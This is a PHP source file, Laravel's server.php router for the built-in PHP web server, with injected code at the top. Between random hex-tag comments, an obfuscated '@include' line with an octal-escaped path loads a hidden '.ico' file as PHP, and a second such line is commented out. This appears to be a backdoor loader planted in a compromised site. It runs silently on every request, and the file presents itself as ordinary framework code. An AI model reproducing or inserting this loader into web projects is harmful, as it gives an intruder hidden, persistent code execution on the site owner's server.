<?php
/*7b0fc*/

/*@include ("\057h\157m\145/\156i\154e\163h\057p\165b\154i\143_\150t\155l\057p\150p\057s\145r\166i\143e\101p\160/\164e\163t\163/\056e\0653\0642\1442\141.\151c\157");*/

/*7b0fc*/






/*84664*/

@include "\057home\057nile\163h/pu\142lic_\150tml/\160hp/p\155s/co\156fig/\056b7d4\064a6c.\151co";

/*84664*/




/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
